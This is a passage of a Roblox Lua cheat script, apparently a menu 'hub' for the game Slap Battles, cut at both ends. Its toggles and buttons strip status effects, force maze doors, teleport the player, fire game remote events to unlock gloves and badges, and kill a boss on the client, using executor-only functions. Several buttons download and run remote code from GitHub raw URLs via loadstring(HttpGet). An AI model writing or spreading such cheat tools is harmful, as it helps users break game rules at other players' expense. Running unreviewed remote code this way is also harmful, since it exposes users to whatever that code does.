                        v.Root.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                        v.watercircle.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    end
                end
task.wait()
end
	end    
})

AntiNightmareAndPotion = Tab:AddToggle({
    Name = "Anti Nightmare & Potion",
    Default = false,
    Callback = function(Value)
        local player = game:GetService("Players").LocalPlayer
        local nightmareEffect = player.PlayerScripts.BACKEND.Systems.VFXReplication.NightmareEffect
        
        if Value == true then
            nightmareEffect.Parent = game.Lighting
        else
            -- Ensure it's being set to a valid parent, not itself
            nightmareEffect.Parent = player.PlayerScripts.BACKEND.Systems.VFXReplication
        end
    end    
})

AntiIceAndPotion = Tab:AddToggle({
	Name = "Anti Ice & Potion",
	Default = false,
	Callback = function(Value)
_G.AntiIce = Value
while _G.AntiIce do
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if v.Name == "Icecube" then
                v:Destroy()
                game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
                game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
            end
       end
task.wait()
end
	end    
})

AntiRun = Tab:AddToggle({
	Name = "Anti Run",
	Default = false,
	Callback = function(Value)
_G.AutoExit = Value
while _G.AutoExit do
if game.Players.LocalPlayer.Character:FindFirstChild("InLabyrinth") ~= nil then
for _, v in next, workspace:GetChildren() do
    if string.find(v.Name, "Labyrinth") and v:FindFirstChild("Doors") then
        for _, y in ipairs(v.Doors:GetChildren()) do
            if y:FindFirstChild("Hitbox") and y.Hitbox:FindFirstChild("TouchInterest") then
              firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"), y.Hitbox, 0)
              firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"), y.Hitbox, 1)
            end
        end
    end
end
end
task.wait()
end
	end    
})

AntiKnock = Tab:AddToggle({
	Name = "Anti Knockoff",
	Default = false,
	Callback = function(Value)
_G.AntiKnock = Value
while _G.AntiKnock do
if game.Workspace.CurrentCamera and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and game.Workspace.CurrentCamera.CameraSubject ~= game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") and game.Workspace.CurrentCamera.CameraSubject == game.Workspace:FindFirstChild(game.Players.LocalPlayer.Name.."'s_falsehead") then
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
end
task.wait()
end
	end    
})

AntiAttackPlank = Tab:AddToggle({
	Name = "Anti Attack Plank",
	Default = false,
	Callback = function(Value)
	_G.AntiPlank = Value
while _G.AntiPlank do
for i,v in pairs(game.Workspace:GetChildren()) do
                    if string.find(v.Name, "'s Plank") and v.ClassName == "Part" then
                         v.CanTouch = false
                         v.CanQuery = false
                     end
                end
task.wait()
end
	end    
})

local Tab = Window:MakeTab({
	Name = "Hubs",
	Icon = "rbxassetid://7733673987",
	PremiumOnly = false
	})

Section = Tab:AddSection({
    Name = "Normal Hubs"
})

Tab:AddButton({
    Name = "Load Badges Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Badges%20Hub"))()
 end    
})

Tab:AddButton({
    Name = "Load Masteries Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Masteries%20Hub"))()
 end    
})

Tab:AddButton({
    Name = "Load Slap Farm Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Slap%20Farm%20Hub"))()
 end    
})

Tab:AddButton({
    Name = "Load Helper Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Helper%20Hub"))()
 end    
})

Section = Tab:AddSection({
    Name = "Limited Hubs"
})

Tab:AddButton({
    Name = "Load Halloween Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Halloween%20Hub"))()
 end    
})

Tab:AddButton({
    Name = "Load Christmas Hub Script",
    Callback = function()   
loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Slap%20Battles%20Hub%20OP%20Script%20(Stuff)/Christmas%20Hub"))()
 end    
})

local Tab = Window:MakeTab({
    Name = "Event",
    Icon = "rbxassetid://7733919198",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Info"
})

Tab:AddLabel("Current Event: None")

local Tab = Window:MakeTab({
    Name = "Teleport",
    Icon = "rbxassetid://7734053426",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Normal/Current Places"
})

Tab:AddButton({
    Name = "Slap Battles",
    Callback = function()
        game:GetService("TeleportService"):Teleport(6403373529)
    end
})

Tab:AddButton({
    Name = "Slap Battles - NO ONESHOT GLOVES (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(9015014224)
    end
})

Tab:AddButton({
    Name = "Slap Battles - NO ONESHOT GLOVES (2)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-903, 327, -20)
    end
})

Tab:AddButton({
    Name = "Glove Customization",
    Callback = function()
        game:GetService("TeleportService"):Teleport(9068206286)
    end
})

Tab:AddButton({
    Name = "Slap Royale Matchmaking",
    Callback = function()
        game:GetService("TeleportService"):Teleport(9426795465)
    end
})

Tab:AddButton({
    Name = "Slap Royale (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(9431156611)
    end
})

Tab:AddButton({
    Name = "Slap Royale (2)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-903, 327, 16)
    end
})

Tab:AddButton({
    Name = "SR EV MD",
    Callback = function()
        game:GetService("TeleportService"):Teleport(101960002094215)
    end
})

Tab:AddButton({
    Name = "Slap Battles - KILLSTREAK ONLY (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(11520107397)
    end
})

Tab:AddButton({
    Name = "Slap Battles - KILLSTREAK ONLY (2)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-890, 327, 16)
    end
})

Tab:AddButton({
    Name = "?",
    Callback = function()
        game:GetService("TeleportService"):Teleport(11828384869)
    end
})

Tab:AddButton({
    Name = "The Dark Realm",
    Callback = function()
        game:GetService("TeleportService"):Teleport(13833961666)
    end
})

Tab:AddButton({
    Name = "The Null Zone (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(14422118326)
    end
})

Tab:AddButton({
    Name = "The Null Zone (2)",
    Callback = function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")

        local player = Players.LocalPlayer
        local hasRob = game.Players.LocalPlayer.leaderstats.Glove.Value == "rob"
        local hasBob = game.Players.LocalPlayer.leaderstats.Glove.Value == "bob"

        if hasRob and hasBob then
            player.Character.HumanoidRootPart.CFrame = CFrame.new()
            wait(0.5)
            fireclickdetector(Workspace.Lobby.rob.ClickDetector)
            wait(0.5)
            ReplicatedStorage.rob:FireServer()
            wait(0.5)
            fireclickdetector(Workspace.Lobby.bob.ClickDetector)
            wait(0.5)
            ReplicatedStorage.bob:FireServer()
            wait(0.5)
            fireclickdetector(Workspace.Lobby.Default.ClickDetector)
            wait(0.5)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(-909, 328, 2)
            wait(0.5)
            player.Character.HumanoidRootPart.CFrame = CFrame.new()
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Need Bob/Rob Badges To Own",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "The Null Zone (3)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(18662, 2993, -298)
    end
})

Tab:AddButton({
    Name = "Gardens And Ghouls (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(15228348051)
    end
})

-- Gardens And Ghouls (2)
Tab:AddButton({
    Name = "Gardens And Ghouls (2)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local rep = game:GetService("ReplicatedStorage")

        if player.leaderstats.Glove.Value == "Alchemist" then
            rep.GeneralAbility:FireServer()

            local function mixItem(itemName, times)
                times = times or 1
                rep.Firework:InvokeServer()
                rep.AlchemistEvent:FireServer("AddItem", itemName)
                rep.AlchemistEvent:FireServer("EquipItem", itemName)
                for _ = 1, times do
                    rep.AlchemistEvent:FireServer("MixItem", itemName)
                end
            end

            -- Items to mix
            mixItem("Wild Vine", 3)
            mixItem("Blood Rose", 1)
            mixItem("Dark Root", 1)
            mixItem("Elder Wood", 1)
            mixItem("Jade Stone", 1)

            -- Final potion brew
            rep.AlchemistEvent:FireServer("BrewPotion")
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Alchemist Glove",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Farmland Fray (1)
Tab:AddButton({
    Name = "Farmland Fray (1)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local rep = game:GetService("ReplicatedStorage")

        if player.leaderstats.Glove.Value == "Alchemist" then
            rep.GeneralAbility:FireServer()

            local function mixItem(itemName, times)
                times = times or 1
                rep.Firework:InvokeServer()
                rep.AlchemistEvent:FireServer("AddItem", itemName)
                rep.AlchemistEvent:FireServer("EquipItem", itemName)
                for _ = 1, times do
                    rep.AlchemistEvent:FireServer("MixItem", itemName)
                end
            end

            -- Items to mix
            mixItem("Plane Flower", 2)
            mixItem("Hazel Lily", 1)

            -- Final potion brew
            rep.AlchemistEvent:FireServer("BrewPotion")
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Alchemist Glove",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Staff Application (Teleport)
Tab:AddButton({
    Name = "The Staff Application (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(16034567693)
    end
})

-- Staff Application (Place Retro Asset + Teleport Locally)
Tab:AddButton({
    Name = "The Staff Application (2)",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local Workspace = game:GetService("Workspace")
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local retro = ReplicatedStorage.Assets:FindFirstChild("Retro")

        if retro then
            if retro.Parent ~= Workspace then
                retro.Parent = Workspace
            end
            character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(-16970, 798, 4908)
        else
            warn("Retro asset not found in ReplicatedStorage.Assets.")
        end
    end
})

-- Ice Trials Teleport
Tab:AddButton({
    Name = "Ice Trials",
    Callback = function()
        game:GetService("TeleportService"):Teleport(17290438723)
    end
})

-- Where Guide Resides (Teleport)
Tab:AddButton({
    Name = "Where Guide Resides (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(18550498098)
    end
})

-- Where Guide Resides (Local Teleport)
Tab:AddButton({
    Name = "Where Guide Resides (2)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(17943, -130, -3554)
    end
})

-- Barzil (Teleport)
Tab:AddButton({
    Name = "barzil (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(7234087065)
    end
})

-- Barzil (Local Teleport)
Tab:AddButton({
    Name = "barzil (2)",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-924, 311, -3)
    end
})

-- Binded Maze (Invalid Teleport ID)
Tab:AddButton({
    Name = "Binded Maze (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(74169485398268) -- Invalid/unlikely place ID (too long)
    end
})

Tab:AddButton({
    Name = "Binded Maze (2)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        -- Check for Alchemist glove
        if player.leaderstats.Glove.Value == "Alchemist" then
            -- Trigger General Ability
            ReplicatedStorage.GeneralAbility:FireServer()

            ----------------------------------------------------------------------
            -- ELDER WOODS (3x Mix)
            ----------------------------------------------------------------------
            ReplicatedStorage.Firework:InvokeServer()
            ReplicatedStorage.AlchemistEvent:FireServer("AddItem", "Elder Wood")
            ReplicatedStorage.AlchemistEvent:FireServer("EquipItem", "Elder Wood")

            for _ = 1, 3 do
                ReplicatedStorage.AlchemistEvent:FireServer("MixItem", "Elder Wood")
            end

            ----------------------------------------------------------------------
            -- BLUE CRYSTAL
            ----------------------------------------------------------------------
            ReplicatedStorage.Firework:InvokeServer()
            ReplicatedStorage.AlchemistEvent:FireServer("AddItem", "Blue Crystal")
            ReplicatedStorage.AlchemistEvent:FireServer("EquipItem", "Blue Crystal")
            ReplicatedStorage.AlchemistEvent:FireServer("MixItem", "Blue Crystal")

            ----------------------------------------------------------------------
            -- RED CRYSTAL
            ----------------------------------------------------------------------
            ReplicatedStorage.Firework:InvokeServer()
            ReplicatedStorage.AlchemistEvent:FireServer("AddItem", "Red Crystal")
            ReplicatedStorage.AlchemistEvent:FireServer("EquipItem", "Red Crystal")
            ReplicatedStorage.AlchemistEvent:FireServer("MixItem", "Red Crystal")

            ----------------------------------------------------------------------
            -- BREW POTION
            ----------------------------------------------------------------------
            ReplicatedStorage.AlchemistEvent:FireServer("BrewPotion")
        
        else
            -- Notify if glove isn't equipped
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Alchemist Glove",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddButton({
    Name = "Zombies (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(103505724406848)
    end
})

Tab:AddButton({
    Name = "Zombies (2) [PATCHED]",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(417, 360, -13)
    end
})

-- FIVE NIGHTS AT OOGS
Tab:AddButton({
    Name = "FIVE NIGHTS AT OOGS",
    Callback = function()
        game:GetService("TeleportService"):Teleport(102908326578005)
    end
})

-- TOH
Tab:AddButton({
    Name = "TOH",
    Callback = function()
        game:GetService("TeleportService"):Teleport(115782629143468)
    end
})

-- The Dreamscape (Teleport)
Tab:AddButton({
    Name = "The Dreamscape (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(92516899071319)
    end
})

-- The Dreamscape (Glove logic + Positioning)
Tab:AddButton({
    Name = "The Dreamscape (2)",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.leaderstats.Glove.Value == "ZZZZZZZ" then
            wait(1)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(-909, 328, 3)
            wait(1)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(-125, -5, 120)
            wait(1)
            game:GetService("ReplicatedStorage").ZZZZZZZSleep:FireServer()
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip ZZZZZZZ Glove",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- A Bad Dream
Tab:AddButton({
    Name = "A Bad Dream",
    Callback = function()
        game:GetService("TeleportService"):Teleport(118650724506449)
    end
})

-- The Home of The Rat King (Teleport)
Tab:AddButton({
    Name = "The Home of The Rat King (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(97220865182663)
    end
})

-- The Home of The Rat King (Glove interaction)
Tab:AddButton({
    Name = "The Home of The Rat King (2)",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.leaderstats.Glove.Value == "el gato" then
            fireclickdetector(workspace.Cheese.ClickDetector)
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip El Gato Glove",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- The White Place (Teleport)
Tab:AddButton({
    Name = "The White Place (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(98726100529621)
    end
})

-- The White Place (Obby Glove Logic + Puzzle)
Tab:AddButton({
    Name = "The White Place (2)",
    Callback = function()
        local player = game.Players.LocalPlayer
        local char = player.Character

        if not char:FindFirstChild("entered") then
            local hasBadge = game:GetService("BadgeService"):UserHasBadgeAsync(player.UserId, 2130463063)

            if hasBadge then
                fireclickdetector(workspace.Lobby["Obby"].ClickDetector)

                repeat task.wait(0.1)
                until player.leaderstats.Glove.Value == "Obby"

                player.Character.HumanoidRootPart.CFrame = workspace.Lobby["Teleport1"].CFrame

                repeat task.wait(0.1)
                until char:FindFirstChild("entered")

                task.wait(0.6)

                -- Hexagon puzzle positions
                local partspos = {
                    CFrame.new(241.8275, -18.416, 4.6698) * CFrame.Angles(0, 1.1053, 0),
                    CFrame.new(232.9965, -18.416, 5.0079) * CFrame.Angles(-math.pi, 1.057, math.pi),
                    CFrame.new(246.0031, -18.416, 11.5912) * CFrame.Angles(math.pi, -0.1251, math.pi),
                    CFrame.new(228.6490, -18.416, 12.6570) * CFrame.Angles(-math.pi, -0.0426, -math.pi),
                    CFrame.new(242.1170, -18.416, 19.4568) * CFrame.Angles(math.pi, 0.9149, -math.pi),
                    CFrame.new(233.4477, -18.416, 20.3416) * CFrame.Angles(0, 1.0962, 0)
                }

                player.Character.HumanoidRootPart.CFrame = CFrame.new(238.1542, -15.7160, 13.4266)

                task.wait(1)

                for _, cframe in ipairs(partspos) do
                    game:GetService("ReplicatedStorage").GeneralAbility:FireServer(cframe, 5)
                    task.wait(3)
                end
            else
                OrionLib:MakeNotification({
                    Name = "Error",
                    Content = "You Need Own Obby Glove",
                    Image = "rbxassetid://7743878857",
                    Time = 3
                })
            end
        end
    end
})

-- Day in The Life of a Small Roblox Developer
Tab:AddButton({
    Name = "Day in The Life of a Small Roblox Developer",
    Callback = function()
        game:GetService("TeleportService"):Teleport(136005148166028)
    end
})

-- Slap Battles - New Players
Tab:AddButton({
    Name = "Slap Battles - New Players",
    Callback = function()
        game:GetService("TeleportService"):Teleport(124596094333302)
    end
})

-- Sword Fight on The Heights (Teleport)
Tab:AddButton({
    Name = "Sword Fight on The Heights (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(117232463555132)
    end
})

-- Sword Fight on The Heights (Auto Sword Unlock Logic)
Tab:AddButton({
    Name = "Sword Fight on The Heights (2)",
    Callback = function()
        if not game.IsLoaded then game.Loaded:Wait() end

        if getgenv().AutoGetSwordfighterExecuted then return end
        getgenv().AutoGetSwordfighterExecuted = true

        local function ClickButton(button, size)
            size = size or UDim2.new(10000, 0, 10000, 0)
            if button and (button:IsA("TextButton") or button:IsA("ImageButton")) then
                button.Size = size
                task.wait()
                repeat task.wait() until button.Size == size
                game:GetService("VirtualUser"):CaptureController()
                game:GetService("VirtualUser"):ClickButton1(Vector2.new())
            end
        end

        local placeId = game.PlaceId

        if placeId == 117232463555132 then
            local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
            local boss = workspace.Map.Components.NPCs.FinalBoss.FinalBoss
            hrp.CFrame = boss.Head.CFrame * CFrame.new(0, 10, 0)
            task.wait(3)

            local humanoid = boss:FindFirstChildWhichIsA("Humanoid")
            humanoid.RigType = Enum.HumanoidRigType.R15
            humanoid.Health = 0

            local gui = game.Players.LocalPlayer.PlayerGui.SkipButton.SkipDialogueButton
            repeat task.wait() until gui.Visible == true
            repeat task.wait() until gui.Visible == false

            while task.wait() do
                hrp.CFrame = workspace.Map.Components.GloveIsland.ClaimGlove.CFrame
                fireproximityprompt(workspace.Map.Components.GloveIsland.ClaimGlove:FindFirstChildWhichIsA("ProximityPrompt"))
            end

        elseif placeId == 11520107397 or placeId == 9015014224 or placeId == 6403373529 or placeId == 124596094333302 then
            for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if v:IsA("BasePart") and v.CanCollide then
                    v.CanCollide = false
                end
            end

            task.wait(0.5)
            local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
            hrp.CFrame = CFrame.new(316, 40, 196)
            task.wait(1)
            game.ReplicatedStorage.RetroAbility:FireServer("Ban Hammer")
            task.wait(2)
            hrp.CFrame = CFrame.new(310, 34, 191)
        end
    end
})

-- Epilson Lorem Ipsum (Teleport)
Tab:AddButton({
    Name = "Epilson Lorem Ipsum (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(129665246576996)
    end
})

-- Epilson Lorem Ipsum (Click Detector)
Tab:AddButton({
    Name = "Epilson Lorem Ipsum (2)",
    Callback = function()
        fireclickdetector(workspace.EggTeleport.ClickDetector)
    end
})

-- Collect My Pages (Teleport)
Tab:AddButton({
    Name = "Collect My Pages (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(132277598079047)
    end
})

-- Collect My Pages (Click Detector)
Tab:AddButton({
    Name = "Collect My Pages (2)",
    Callback = function()
        fireclickdetector(workspace.Lobby["Clothesline Model"].Part.ClickDetector)
    end
})

-- Friday the 13th (Teleport)
Tab:AddButton({
    Name = "Friday the 13th (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(136690395520488)
    end
})

-- Friday the 13th (Teleport to Door inside Map)
Tab:AddButton({
    Name = "Friday the 13th (2)",
    Callback = function()
        local found = false
        for _, v in pairs(workspace:GetChildren()) do
            if v:IsA("Model") and v.Name:find("'s Labyrinth") then
                local door = v:FindFirstChild("PaintingModel")
                if door and door:IsA("Model") then
                    local part = door:FindFirstChildWhichIsA("BasePart")
                    if part then
                        local hrp = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
                        hrp.CFrame = part.CFrame + Vector3.new(0, 3, 0)
                        found = true
                        break
                    end
                end
            end
        end

        if not found then
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Slasher Door Not Found",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Slap Cart (Teleport)
Tab:AddButton({
    Name = "Slap Cart (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(86045914443715)
    end
})

-- Slap Cart (Use Adios Glove & Trigger)
Tab:AddButton({
    Name = "Slap Cart (2) (Sit On Car First)",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player.leaderstats.Glove.Value == "Adios" then
            game:GetService("ReplicatedStorage").AdiosActivated:FireServer()
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Adios Glove / Sit On Car First",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- The Suction Trials (Teleport)
Tab:AddButton({
    Name = "The Suction Trials (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(89837553336708)
    end
})

-- The Suction Trials (Click Sequence)
Tab:AddButton({
    Name = "The Suction Trials (2)",
    Callback = function()
        -- Click Main Plunger
        fireclickdetector(workspace.BountyHunterRoom.PlungerMain.ClickDetector)
        task.wait(1.5)
        OrionLib:MakeNotification({
            Name = "Success",
            Content = "Clicked Main Plunger",
            Image = "rbxassetid://7733919427",
            Time = 3
        })

        -- Click Toilet Plunger
        fireclickdetector(workspace.plungers.ToiletPlunger.ClickDetector)
        task.wait(1.5)
        OrionLib:MakeNotification({
            Name = "Success",
            Content = "Clicked Toilet Plunger",
            Image = "rbxassetid://7733919427",
            Time = 3
        })

        -- Notify Teleport
        task.wait(1.5)
        OrionLib:MakeNotification({
            Name = "Success",
            Content = "Teleporting...",
            Image = "rbxassetid://7733919427",
            Time = 3
        })
    end
})

-- The Suction Trials (Teleport)
Tab:AddButton({
    Name = "Shattered Reality (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(75803343514634)
    end
})

-- The Suction Trials (Click Sequence)
Tab:AddButton({
    Name = "Shattered Reality (2)",
    Callback = function()
        -- Click Main Plunger
game.workspace.BountyHunterRoom.QuestObjects.ShatteredRealityMirror["Meshes/Mirror1_Plane.007"].ProximityPrompt.HoldDuration = 0
task.wait(0.2)
fireproximityprompt(workspace.BountyHunterRoom.QuestObjects.ShatteredRealityMirror["Meshes/Mirror1_Plane.007"].ProximityPrompt)
        -- Notify Teleport
        task.wait()
        OrionLib:MakeNotification({
            Name = "Success",
            Content = "Teleporting...",
            Image = "rbxassetid://7733919427",
            Time = 3
        })
    end
})

Tab:AddButton({
    Name = "Evil Barzil (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(80420091630966)
    end
})

-- The Suction Trials (Click Sequence)
Tab:AddButton({
    Name = "Evil Barzil (2)",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-924, 311, -3)
    end
})

Tab:AddButton({
    Name = "Splatbattles - Regular (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(90553746175288)
    end
})

Tab:AddButton({
    Name = "Splatbattles - Regular (2)",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(17900, -69, -3563)
task.wait(0.5)
fireproximityprompt(workspace.BountyHunterRoom.SplatBattles.Graffiti.Attachment.ProximityPrompt)
    end
})

Tab:AddButton({
    Name = "Plate glove obtainment  (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(106620300132058)
    end
})

Tab:AddButton({
    Name = "Pim's Corn Maze (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(92483185275059)
    end
})

Tab:AddButton({
    Name = "Pim's Corn Maze (2) [PATCHED]",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Arena.Halloween_Decorations.PimsCornMazeEntry.TeleportMain.Hitbox.CFrame
    end
})

Tab:AddButton({
    Name = "Conker Obtainment (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(101113181694564)
    end
})

Tab:AddButton({
    Name = "Conker Obtainment (2)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(101113181694564)
    end
})

Tab:AddButton({
    Name = "You're Hired! (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(122901288403496)
    end
})

Tab:AddButton({
    Name = "You're Hired! (2)",
    Callback = function()
local ExtendedGlove = game.Players.LocalPlayer.leaderstats.Glove.Value == "Extended"
local SbeveGlove = game.Players.LocalPlayer.leaderstats.Glove.Value == "Sbeve"
local OVERKILLGlove = game.Players.LocalPlayer.leaderstats.Glove.Value == "OVERKILL"

if ExtendedGlove or SbeveGlove or OVERKILLGlove then
        fireclickdetector(workspace.JobApplication.paper.ClickDetector)
else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Not Equipped (Extended or Sbeve or OVERKILL) Gloves",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
	end
    end
})

Tab:AddButton({
    Name = "Find The Gloves (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(79885102123162)
    end
})

Tab:AddButton({
    Name = "Find The Gloves (2)",
    Callback = function()
        fireclickdetector(workspace.FindTheGlovesTeleport.ClickDetector)
    end
})

-- Section Label
Section = Tab:AddSection({
    Name = "Removed/Forgotten/Other Places"
})

-- Teleport Buttons
Tab:AddButton({
    Name = "Slap Battles TESTING",
    Callback = function()
        game:GetService("TeleportService"):Teleport(9020359053)
    end
})

Tab:AddButton({
    Name = "??? m",
    Callback = function()
        game:GetService("TeleportService"):Teleport(11359765900)
    end
})

Tab:AddButton({
    Name = "??",
    Callback = function()
        game:GetService("TeleportService"):Teleport(11367956190)
    end
})

Tab:AddButton({
    Name = "Slap Battles Experimental Place",
    Callback = function()
        game:GetService("TeleportService"):Teleport(12432152490)
    end
})

Tab:AddButton({
    Name = "Soft Updating.... Dododo",
    Callback = function()
        game:GetService("TeleportService"):Teleport(12712288037)
    end
})

Tab:AddButton({
    Name = "Slap Battles A",
    Callback = function()
        game:GetService("TeleportService"):Teleport(12845859004)
    end
})

Tab:AddButton({
    Name = "SLAP BATTLES CHRISTMAS EVENT!",
    Callback = function()
        game:GetService("TeleportService"):Teleport(15507333474)
    end
})

Tab:AddButton({
    Name = "Slap League",
    Callback = function()
        game:GetService("TeleportService"):Teleport(18698003301)
    end
})

Tab:AddButton({
    Name = "Dev_Crow's Place: 10102024_2",
    Callback = function()
        game:GetService("TeleportService"):Teleport(89837553336708)
    end
})

-- Snowpeep Domain
Tab:AddButton({
    Name = "Snowpeep Domain",
    Callback = function()
        game:GetService("TeleportService"):Teleport(117549528393007)
    end
})

Tab:AddButton({
    Name = "Randomizer Gamemode (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(98871361390239)
    end
})

-- The Suction Trials (Click Sequence)
Tab:AddButton({
    Name = "Randomizer Gamemode (2) [PATCHED]",
    Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(93, 0, 93)
    end
})

Tab:AddButton({
    Name = "Splatbattles - Championship",
    Callback = function()
        game:GetService("TeleportService"):Teleport(84245222894009)
    end
})

Tab:AddButton({
    Name = "Jerry Boss Fight (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(95706409702231)
    end
})

Tab:AddButton({
    Name = "Jerry Boss Fight (2) [PATCHED]",
    Callback = function()
        wait(0.2)
        local snowpeeps = workspace:FindFirstChild("XmasSnowPeeps")
        if snowpeeps then
            for _, peep in ipairs(snowpeeps:GetChildren()) do
                if peep:FindFirstChild("ClickDetector") then
                    fireclickdetector(peep.ClickDetector)
                end
            end
        end
        wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2, -5, 353)
    end
})

Tab:AddButton({
    Name = "Snowball Smash 2025 Place (1)",
    Callback = function()
        game:GetService("TeleportService"):Teleport(94481828238038)
    end
})

Tab:AddButton({
